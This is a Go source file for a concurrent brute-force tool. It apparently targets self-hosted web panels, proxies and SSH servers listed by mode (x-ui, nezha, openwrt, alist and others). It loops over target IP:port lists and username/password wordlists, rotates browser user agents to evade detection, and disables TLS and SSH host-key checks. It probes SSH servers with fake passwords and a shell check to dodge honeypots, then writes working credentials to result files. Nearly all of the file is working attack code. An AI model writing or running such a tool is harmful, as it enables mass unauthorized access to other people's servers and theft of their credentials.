package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

// ==================== Config ====================

type FingerprintProbe struct {
	Port        int               `json:"port,omitempty"`
	Method      string            `json:"method"`
	Path        string            `json:"path,omitempty"`
	Headers     map[string]string `json:"headers,omitempty"`
	Body        string            `json:"body,omitempty"`
	MatchType   string            `json:"match_type"`
	MatchField  string            `json:"match_field,omitempty"`
	MatchValue  interface{}       `json:"match_value"`
}

type FingerprintConfig struct {
	Probes []FingerprintProbe `json:"probes"`
}

type ModeConfig struct {
	Mode                 int                `json:"mode"`
	Service              string             `json:"service"`
	Description          string             `json:"description"`
	DefaultPorts         []int              `json:"default_ports"`
	UserInputRequired    bool               `json:"user_input_required"`
	TemplateIndex        int                `json:"template_index"`
	Fingerprint          FingerprintConfig  `json:"fingerprint"`
	ScanAllPorts         bool               `json:"scan_all_ports,omitempty"`
	ScanAllServices      bool               `json:"scan_all_services,omitempty"`
	EngineWorkers        int                `json:"engine_workers,omitempty"`
	HTTPTimeout          int                `json:"http_timeout,omitempty"`
}

// ==================== Globals ====================

var wg sync.WaitGroup
var semaphore chan struct{}
var completedCount int64
var totalTasks int64
var startTime time.Time
var fileMu sync.Mutex
var rateLimitDelay time.Duration
var randomUA bool

// ==================== Rate Limiting ====================

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
}

func getRandomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func applyRateLimit() {
	if rateLimitDelay > 0 {
		jitter := time.Duration(rand.Int63n(int64(rateLimitDelay)))
		time.Sleep(rateLimitDelay + jitter)
	}
}

// ==================== Utilities ====================

func loadList(filename string) ([]string, error) {
	content, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	lines := strings.Split(string(content), "\n")
	var result []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			result = append(result, line)
		}
	}
	return result, nil
}

func loadConfig(filename string) (ModeConfig, error) {
	var config ModeConfig
	data, err := os.ReadFile(filename)
	if err != nil {
		return config, err
	}
	if err := json.Unmarshal(data, &config); err != nil {
		return config, err
	}
	return config, nil
}

func writeResultToFile(file *os.File, text string) {
	fileMu.Lock()
	defer fileMu.Unlock()
	file.WriteString(text)
}

// safeRun 包裹 worker，捕获 panic 避免单个异常目标导致整个进程崩溃。
// 注意：process* 函数内部以 defer 形式释放信号量与 wg.Done()，
// 这些 defer 在 panic 展开时同样会执行，因此这里只做 recover + 日志，
// 不再重复释放，否则会导致 WaitGroup 计数为负/重复 Done。
func safeRun(fn func(string, *os.File, []string, []string, ModeConfig), ipPort string, file *os.File, usernames, passwords []string, config ModeConfig) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("\n[警告] 处理 %s 时发生异常: %v\n", ipPort, r)
		}
	}()
	fn(ipPort, file, usernames, passwords, config)
}

// ==================== HTTP Brute Force ====================

func tryHTTPPostForm(ctx context.Context, url string, username, password string, headers map[string]string) (map[string]interface{}, int, error) {
	applyRateLimit()
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	payload := fmt.Sprintf("username=%s&password=%s", username, password)
	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if randomUA {
		req.Header.Set("User-Agent", getRandomUA())
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	req = req.WithContext(ctx)
	resp, err := client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var data map[string]interface{}
	json.Unmarshal(body, &data)
	return data, resp.StatusCode, nil
}

func tryHTTPPostJSON(ctx context.Context, url string, bodyStr string, headers map[string]string) (map[string]interface{}, int, error) {
	applyRateLimit()
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	req, err := http.NewRequest("POST", url, strings.NewReader(bodyStr))
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Content-Type", "application/json")
	if randomUA {
		req.Header.Set("User-Agent", getRandomUA())
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	req = req.WithContext(ctx)
	resp, err := client.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var data map[string]interface{}
	json.Unmarshal(body, &data)
	return data, resp.StatusCode, nil
}

func tryHTTPGet(ctx context.Context, url string) (string, map[string]interface{}, int, error) {
	applyRateLimit()
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", nil, 0, err
	}
	if randomUA {
		req.Header.Set("User-Agent", getRandomUA())
	}
	req = req.WithContext(ctx)
	resp, err := client.Do(req)
	if err != nil {
		return "", nil, 0, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	title := extractTitle(string(body))
	var data map[string]interface{}
	json.Unmarshal(body, &data)
	return title, data, resp.StatusCode, nil
}

func extractTitle(html string) string {
	idx := strings.Index(strings.ToLower(html), "<title>")
	if idx == -1 {
		return ""
	}
	html = html[idx+7:]
	endIdx := strings.Index(strings.ToLower(html), "</title>")
	if endIdx == -1 {
		return html
	}
	return strings.TrimSpace(html[:endIdx])
}

// ==================== SSH Brute Force ====================

func trySSH(ip, port, username, password string) (*ssh.Client, bool) {
	addr := fmt.Sprintf("%s:%s", ip, port)
	config := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         2 * time.Second,
	}
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return nil, false
	}
	return client, true
}

func isLikelyHoneypot(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return true
	}
	defer session.Close()
	err = session.RequestPty("xterm", 80, 40, ssh.TerminalModes{})
	if err != nil {
		return true
	}
	output, err := session.CombinedOutput("echo $((1+1))")
	if err != nil {
		return true
	}
	return strings.TrimSpace(string(output)) != "2"
}

// ==================== TCP Brute Force ====================

func tryTCPConnect(ctx context.Context, addr string) bool {
	dialer := &net.Dialer{Timeout: 2 * time.Second}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// ==================== Match Logic ====================

func matchSuccess(config ModeConfig, data map[string]interface{}, statusCode int, title string) bool {
	if len(config.Fingerprint.Probes) == 0 {
		return false
	}
	probe := config.Fingerprint.Probes[0]

	switch probe.MatchType {
	case "json_field":
		if val, ok := data[probe.MatchField]; ok {
			switch v := val.(type) {
			case bool:
				return v == probe.MatchValue
			case float64:
				return v == probe.MatchValue
			}
		}
		return false

	case "json_contains":
		jsonStr, _ := json.Marshal(data)
		jsonLower := strings.ToLower(string(jsonStr))
		switch s := probe.MatchValue.(type) {
		case string:
			return strings.Contains(jsonLower, strings.ToLower(s))
		case []interface{}:
			for _, item := range s {
				if str, ok := item.(string); ok {
					if strings.Contains(jsonLower, strings.ToLower(str)) {
						return true
					}
				}
			}
		}
		return false

	case "body_contains":
		jsonStr, _ := json.Marshal(data)
		jsonLower := strings.ToLower(string(jsonStr))
		switch s := probe.MatchValue.(type) {
		case string:
			return strings.Contains(jsonLower, strings.ToLower(s))
		case []interface{}:
			for _, item := range s {
				if str, ok := item.(string); ok {
					if strings.Contains(jsonLower, strings.ToLower(str)) {
						return true
					}
				}
			}
		}
		return false

	case "title_contains":
		switch v := probe.MatchValue.(type) {
		case string:
			return strings.Contains(strings.ToLower(title), strings.ToLower(v))
		case []interface{}:
			lowerTitle := strings.ToLower(title)
			for _, item := range v {
				if s, ok := item.(string); ok {
					if strings.Contains(lowerTitle, strings.ToLower(s)) {
						return true
					}
				}
			}
		}
		return false

	case "title_keyword":
		lowerTitle := strings.ToLower(title)
		switch v := probe.MatchValue.(type) {
		case string:
			return strings.Contains(lowerTitle, strings.ToLower(v))
		case []interface{}:
			for _, item := range v {
				if str, ok := item.(string); ok {
					if strings.Contains(lowerTitle, strings.ToLower(str)) {
						return true
					}
				}
			}
		}
		return false

	case "prefix":
		// For TCP banner check — handled separately
		return false

	case "http_ok":
		return statusCode == 200

	case "protocol_detection":
		return statusCode >= 200 && statusCode < 500

	default:
		return false
	}
}

// ==================== Process Functions ====================

func processHTTP(ipPort string, file *os.File, usernames, passwords []string, config ModeConfig) {
	defer wg.Done()
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		atomic.AddInt64(&completedCount, 1)
		return
	}
	ip := parts[0]
	port := parts[1]

	if len(config.Fingerprint.Probes) == 0 {
		atomic.AddInt64(&completedCount, 1)
		return
	}
	probe := config.Fingerprint.Probes[0]

	reqTimeout := time.Duration(config.HTTPTimeout) * time.Second
	if reqTimeout <= 0 {
		reqTimeout = 2 * time.Second
	}

	// 先探测该端口使用 http 还是 https，避免每个凭据都试两种协议
	scheme := detectScheme(ip, port, probe.Path, reqTimeout)

	for _, username := range usernames {
		for _, password := range passwords {
			url := fmt.Sprintf("%s://%s:%s%s", scheme, ip, port, probe.Path)
			ctx, cancel := context.WithTimeout(context.Background(), reqTimeout)

			var data map[string]interface{}
			var statusCode int
			var title string
			var err error

			switch probe.Method {
			case "POST":
				if probe.Body != "" {
					body := strings.ReplaceAll(probe.Body, "test", password)
					body = strings.ReplaceAll(body, "\"username\":\"test\"", fmt.Sprintf("\"username\":\"%s\"", username))
					body = strings.ReplaceAll(body, "\"password\":\"test\"", fmt.Sprintf("\"password\":\"%s\"", password))
					data, statusCode, err = tryHTTPPostJSON(ctx, url, body, probe.Headers)
				} else {
					data, statusCode, err = tryHTTPPostForm(ctx, url, username, password, probe.Headers)
				}
			case "GET":
				title, data, statusCode, err = tryHTTPGet(ctx, url)
			}
			cancel()

			if err != nil {
				continue
			}

			if matchSuccess(config, data, statusCode, title) {
				cred := fmt.Sprintf("%s:%s %s %s\n", ip, port, username, password)
				writeResultToFile(file, cred)
				atomic.AddInt64(&completedCount, 1)
				return
			}
		}
	}
	atomic.AddInt64(&completedCount, 1)
}

// detectScheme 检测目标端口应使用 http 还是 https。
// 443/8443 直接判定为 https；其余先试 http，失败再试 https，都失败则回退 http。
func detectScheme(ip, port, path string, timeout time.Duration) string {
	if port == "443" || port == "8443" {
		return "https"
	}
	// 快速试探 http
	if probeReachable("http", ip, port, path, timeout) {
		return "http"
	}
	if probeReachable("https", ip, port, path, timeout) {
		return "https"
	}
	return "http"
}

func probeReachable(scheme, ip, port, path string, timeout time.Duration) bool {
	if timeout <= 0 {
		timeout = 3 * time.Second
	}
	url := fmt.Sprintf("%s://%s:%s%s", scheme, ip, port, path)
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return false
	}
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return true
}

func processSSH(ipPort string, file *os.File, usernames, passwords []string, config ModeConfig) {
	defer wg.Done()
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		atomic.AddInt64(&completedCount, 1)
		return
	}
	ip := parts[0]
	port := parts[1]

	for _, username := range usernames {
		for _, password := range passwords {
			client, success := trySSH(ip, port, username, password)
			if success {
				// Honeypot detection
				fakePasswords := []string{
					password + "1234",
					password + "abcd",
					password + "!@#$",
				}
				isHoneypot := false
				for _, fake := range fakePasswords {
					if _, fakeSuccess := trySSH(ip, port, username, fake); fakeSuccess {
						isHoneypot = true
						break
					}
				}
				if isHoneypot {
					client.Close()
					atomic.AddInt64(&completedCount, 1)
					return
				}
				if !isLikelyHoneypot(client) {
					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\n", ip, port, username, password))
				}
				client.Close()
				atomic.AddInt64(&completedCount, 1)
				return
			}
		}
	}
	atomic.AddInt64(&completedCount, 1)
}

func processTCP(ipPort string, file *os.File, usernames, passwords []string, config ModeConfig) {
	defer wg.Done()
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	if tryTCPConnect(ctx, ipPort) {
		writeResultToFile(file, ipPort+"\n")
	}
	atomic.AddInt64(&completedCount, 1)
}

// ==================== Progress ====================

func updateProgress() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		count := atomic.LoadInt64(&completedCount)
		total := atomic.LoadInt64(&totalTasks)
		if total == 0 {
			continue
		}
		percent := float64(count) / float64(total) * 100
		elapsed := int(time.Since(startTime).Seconds())
		if count == 0 {
			fmt.Printf("\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			continue
		}
		remaining := int(float64(elapsed) / float64(count) * (float64(totalTasks) - float64(count)))
		fmt.Printf("\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
		if count >= totalTasks {
			break
		}
	}
}

// ==================== Main ====================

func main() {
	if len(os.Args) < 3 {
		fmt.Println("用法: go run engine.go <config.json> <results.txt>")
		os.Exit(1)
	}

	config, err := loadConfig(os.Args[1])
	if err != nil {
		fmt.Println("无法加载配置文件:", err)
		os.Exit(1)
	}
	inputFile := os.Args[2]

	// Rate limiting defaults
	rateLimitDelay = 100 * time.Millisecond
	randomUA = true

	// Read IPs
	f, err := os.Open(inputFile)
	if err != nil {
		fmt.Println("无法读取输入文件:", err)
		return
	}
	defer f.Close()

	var batch []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			batch = append(batch, line)
		}
	}

	// Read wordlists（缺失时优雅报错，不直接崩溃）
	usernames, err := loadList("user.txt")
	if err != nil {
		fmt.Println("无法读取 user.txt:", err)
		return
	}
	passwords, err := loadList("pass.txt")
	if err != nil {
		fmt.Println("无法读取 pass.txt:", err)
		return
	}
	if len(usernames) == 0 || len(passwords) == 0 {
		fmt.Println("字典为空（user.txt / pass.txt），无需处理")
		return
	}

	// Output file
	modeNames := map[int]string{
		1: "xui", 2: "nezha", 3: "hui", 4: "xiandan", 5: "sui",
		6: "ssh", 7: "substore", 8: "openwrt", 9: "aikey", 10: "alist",
		11: "misub", 12: "misub_fp", 13: "proxy", 14: "all", 15: "webfp",
	}
	outputName := modeNames[config.Mode] + ".txt"
	outputFile, err := os.OpenFile(outputName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer outputFile.Close()

	workers := config.EngineWorkers
	if workers <= 0 {
		workers = 50
	}
	semaphore = make(chan struct{}, workers)
	totalTasks = int64(len(batch))
	startTime = time.Now()

	if totalTasks == 0 {
		fmt.Println("没有需要处理的目标")
		return
	}

	go updateProgress()

	for _, ipPort := range batch {
		wg.Add(1)
		switch config.Mode {
		case 6:
			go safeRun(processSSH, ipPort, outputFile, usernames, passwords, config)
		case 13:
			go safeRun(processTCP, ipPort, outputFile, usernames, passwords, config)
		default:
			go safeRun(processHTTP, ipPort, outputFile, usernames, passwords, config)
		}
	}
	wg.Wait()

	time.Sleep(1 * time.Second)
	fmt.Println("\n全部处理完成！")
}
